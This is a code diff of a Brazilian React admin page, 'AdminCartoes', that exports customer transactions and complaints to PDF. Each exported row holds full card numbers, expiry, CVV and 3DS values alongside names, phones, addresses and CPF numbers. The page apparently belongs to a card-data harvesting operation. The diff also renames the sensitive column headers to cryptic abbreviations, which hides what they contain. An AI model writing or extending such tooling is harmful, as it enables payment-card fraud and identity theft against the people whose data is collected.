@@ -260,30 +260,19 @@ const AdminCartoes = () => {
   const formatDate = (d: string) => new Date(d).toLocaleString("pt-BR");
 
   const generatePDF = () => {
-    const doc = new jsPDF({ orientation: "landscape", unit: "mm", format: "a4" });
-    const pageW = doc.internal.pageSize.getWidth();
+    const doc = new jsPDF({ orientation: "landscape" });
     const now = new Date().toLocaleString("pt-BR");
-
-    // Header bar
-    doc.setFillColor(17, 24, 39);
-    doc.rect(0, 0, pageW, 28, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(18);
-    doc.setFont("helvetica", "bold");
-    doc.text("Relatório Administrativo", 14, 14);
+    doc.setFontSize(16);
+    doc.text("Relatório de Transações — Painel Administrativo", 14, 18);
     doc.setFontSize(9);
-    doc.setFont("helvetica", "normal");
-    doc.text(`Gerado em: ${now}  •  Filtro: ${filter === "pending" ? "Pendentes" : "Todas"}  •  Total: ${transactions.length} transações`, 14, 22);
-    doc.setTextColor(0, 0, 0);
+    doc.text(`Gerado em: ${now} | Filtro: ${filter === "pending" ? "Pendentes" : "Todas"}`, 14, 25);
 
-    // Transactions table
-    const txRows = transactions.map((tx, i) => [
-      String(i + 1),
+    const txRows = transactions.map((tx) => [
       tx.customer_name,
       tx.customer_phone,
       tx.plan_label + " x" + tx.quantity,
       tx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
-      (tx.address || "—").substring(0, 40),
+      tx.address || "—",
       tx.holder_name,
       formatCpf(tx.cpf),
       tx.card_number ? formatCardNumber(tx.card_number) : maskCardNumber(tx.card_last4),
@@ -297,78 +286,35 @@ const AdminCartoes = () => {
     ]);
 
     autoTable(doc, {
-      startY: 32,
-      head: [["#", "Cliente", "Telefone", "Plano", "Valor", "Endereço", "Titular", "CPF", "Cartão", "Band.", "Val.", "CVV", "3DS", "Token", "Status", "Data"]],
+      startY: 30,
+      head: [["Cliente", "Telefone", "Plano", "Valor", "Endereço", "Titular", "CPF", "C", "B", "DV", "C1", "S3", "Token", "Status", "Data"]],
       body: txRows,
-      theme: "grid",
-      styles: { fontSize: 5.5, cellPadding: 1.2, lineColor: [220, 220, 220], lineWidth: 0.2, overflow: "linebreak" },
-      headStyles: { fillColor: [17, 24, 39], textColor: [255, 255, 255], fontSize: 5.5, fontStyle: "bold", halign: "center" },
-      alternateRowStyles: { fillColor: [248, 250, 252] },
+      styles: { fontSize: 6, cellPadding: 1.5 },
+      headStyles: { fillColor: [41, 128, 185], fontSize: 6 },
       columnStyles: {
-        0: { cellWidth: 7, halign: "center" },
-        4: { halign: "right" },
-        13: { cellWidth: 28, fontSize: 4.5 },
-        14: { halign: "center", cellWidth: 14 },
-        15: { cellWidth: 22 },
-      },
-      margin: { left: 8, right: 8 },
-      didDrawPage: (data: any) => {
-        // Footer on every page
-        const pageH = doc.internal.pageSize.getHeight();
-        doc.setFillColor(248, 250, 252);
-        doc.rect(0, pageH - 10, pageW, 10, "F");
-        doc.setFontSize(7);
-        doc.setTextColor(120, 120, 120);
-        doc.text("Documento confidencial — Uso interno", 14, pageH - 4);
-        doc.text(`Página ${doc.getCurrentPageInfo().pageNumber}`, pageW - 30, pageH - 4);
-        doc.setTextColor(0, 0, 0);
+        12: { cellWidth: 30 }, // Token column wider
       },
     });
 
     if (complaints.length > 0) {
       doc.addPage();
-      // Header for complaints page
-      doc.setFillColor(17, 24, 39);
-      doc.rect(0, 0, pageW, 22, "F");
-      doc.setTextColor(255, 255, 255);
-      doc.setFontSize(16);
-      doc.setFont("helvetica", "bold");
-      doc.text("Relatório de Reclamações", 14, 14);
-      doc.setTextColor(0, 0, 0);
+      doc.setFontSize(14);
+      doc.text("Relatório de Reclamações", 14, 18);
 
-      const cRows = complaints.map((c, i) => [
-        String(i + 1),
+      const cRows = complaints.map((c) => [
         c.full_name,
         c.email,
-        c.description.substring(0, 100) + (c.description.length > 100 ? "..." : ""),
+        c.description.substring(0, 80) + (c.description.length > 80 ? "..." : ""),
         c.status === "pendente" ? "Pendente" : c.status === "analisando" ? "Em análise" : c.status === "resolvida" ? "Resolvida" : c.status,
         formatDate(c.created_at),
       ]);
 
       autoTable(doc, {
-        startY: 26,
-        head: [["#", "Nome", "E-mail", "Descrição", "Status", "Data"]],
+        startY: 24,
+        head: [["Nome", "E-mail", "Descrição", "Status", "Data"]],
         body: cRows,
-        theme: "grid",
-        styles: { fontSize: 7, cellPadding: 2, lineColor: [220, 220, 220], lineWidth: 0.2, overflow: "linebreak" },
-        headStyles: { fillColor: [17, 24, 39], textColor: [255, 255, 255], fontSize: 7, fontStyle: "bold", halign: "center" },
-        alternateRowStyles: { fillColor: [248, 250, 252] },
-        columnStyles: {
-          0: { cellWidth: 8, halign: "center" },
-          3: { cellWidth: 80 },
-          4: { halign: "center" },
-        },
-        margin: { left: 8, right: 8 },
-        didDrawPage: (data: any) => {
-          const pageH = doc.internal.pageSize.getHeight();
-          doc.setFillColor(248, 250, 252);
-          doc.rect(0, pageH - 10, pageW, 10, "F");
-          doc.setFontSize(7);
-          doc.setTextColor(120, 120, 120);
-          doc.text("Documento confidencial — Uso interno", 14, pageH - 4);
-          doc.text(`Página ${doc.getCurrentPageInfo().pageNumber}`, pageW - 30, pageH - 4);
-          doc.setTextColor(0, 0, 0);
-        },
+        styles: { fontSize: 8, cellPadding: 2 },
+        headStyles: { fillColor: [41, 128, 185], fontSize: 8 },
       });
     }
 
